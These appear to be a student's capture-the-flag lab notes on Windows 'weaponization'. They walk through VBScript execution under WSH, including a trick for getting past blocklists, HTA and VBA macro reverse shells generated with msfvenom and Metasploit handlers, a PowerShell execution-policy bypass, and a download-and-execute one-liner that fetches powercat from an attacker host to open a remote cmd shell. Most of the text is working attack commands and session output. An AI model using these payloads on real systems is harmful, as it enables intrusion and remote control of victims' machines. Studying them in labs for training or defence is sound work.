# Weaponization

## Windows Scripting Host (WSH)
It is a Windows native engine, `cscript.exe` (for command-line scripts) and `wscript.exe` (for UI scripts), which are responsible for executing various Microsoft Visual Basic Scripts (VBScript), including vbs and vbe.   
```
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```
```
c:\Windows\System32>wscript c:\Users\thm\Desktop\payload.vbs
c:\Windows\System32>cscript.exe c:\Users\thm\Desktop\payload.vbs 
```
Another trick. If the VBS files are blacklisted, then we can rename the file to `.txt` file and run it using `wscript` as follows,
```
c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
```  

## An HTML Application (HTA)
HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered. HTML Applications, also known as HTAs, which are dynamic `HTML` pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool `mshta` is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer.  
### HTA Reverse Connection
```
user@machine$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of hta-psh file: 7692 bytes
Saved as: thm.hta
```
```
user@machine$ python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
```
On the victim machine, visit the malicious link using Microsoft Edge, http://ATTACKER_IP:PORT/payload.hta  

```
user@machine$ sudo nc -lvp 443
listening on [any] 443 ...
10.8.232.37: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.201.254] 52910
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\thm\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads>
pState\Downloads>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 4:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::fce4:699e:b440:7ff3%2
   IPv4 Address. . . . . . . . . . . : 10.10.201.254
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1
```
### Malicious HTA via Metasploit 
```
msf6 > use exploit/windows/misc/hta_server
msf6 exploit(windows/misc/hta_server) > set LHOST 10.8.232.37
LHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set LPORT 443
LPORT => 443
msf6 exploit(windows/misc/hta_server) > set SRVHOST 10.8.232.37
SRVHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/misc/hta_server) >
[*] Started reverse TCP handler on 10.8.232.37:443
[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta
[*] Server started.
```

## Visual Basic for Application (VBA)
```
user@AttackBox$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of vba file: 2698 bytes
```
Import to note that one modification needs to be done to make this work.  The output will be working on an MS excel sheet. Therefore, change the `Workbook_Open()` to `Document_Open()` to make it suitable for MS word documents.  
```
user@AttackBox$ msfconsole -q
msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.50.159.15
LHOST => 10.50.159.15
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf5 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.50.159.15:443 
```

## PowerShell (PSH)
### Execution Policy
```
C:\Users\thm\Desktop>powershell -File thm.ps1
File C:\Users\thm\Desktop\thm.ps1 cannot be loaded because running scripts is disabled on this system. For more
information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
    + CategoryInfo          : SecurityError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : UnauthorizedAccess
```
```
PS C:\Users\thm> Get-ExecutionPolicy
Restricted
```
### Bypass Execution Policy
`-ex bypass`
```
C:\Users\thm\Desktop>powershell -ex bypass -File thm.ps1
Welcome to Weaponization Room!
```
- `powercat`
```
user@machine$ git clone https://github.com/besimorhino/powercat.git
Cloning into 'powercat'...
remote: Enumerating objects: 239, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 239 (delta 0), reused 2 (delta 0), pack-reused 235
Receiving objects: 100% (239/239), 61.75 KiB | 424.00 KiB/s, done.
Resolving deltas: 100% (72/72), done.

user@machine$ cd powercat
user@machine$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```
```
user@machine$ nc -lvp 1337
```
Now, from the victim machine, we download the payload and execute it using PowerShell payload as follows,
```
C:\Users\thm\Desktop> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
```
